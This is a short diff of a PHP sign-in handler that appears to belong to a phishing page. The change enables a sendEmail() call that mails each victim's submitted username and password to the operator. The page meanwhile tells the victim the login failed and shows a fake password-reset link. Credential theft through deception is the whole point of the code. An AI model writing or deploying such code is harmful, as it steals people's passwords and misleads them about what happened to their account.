@@ -95,12 +95,8 @@ if(isset($_POST["sign-in"])) {
     $username = sanitize($_POST["username"]);
     $password = sanitize($_POST["password"]);
 
-    // sendEmail(["username" => $username, "password" => $password]);
-    $_SESSION['num'] = 1;
-    $_SESSION['message'] = "Your account or password is incorrect. If you don't remember your password, <a href='#' class='new-link'>reset it now.</a>";
+    sendEmail(["username" => $username, "password" => $password]);
 
-    // REMEMBER TO CHANGE THIS PATH IF YOUR'RE HOSTING ON DIFFERENT SERVER
-    // header("Location: ./index.php?page=login");
     echo $response = json_encode([
         "message" => "Your account or password is incorrect. If you don't remember your password, <a href='#' class='new-link'>reset it now.</a>",
         "error" => NULL
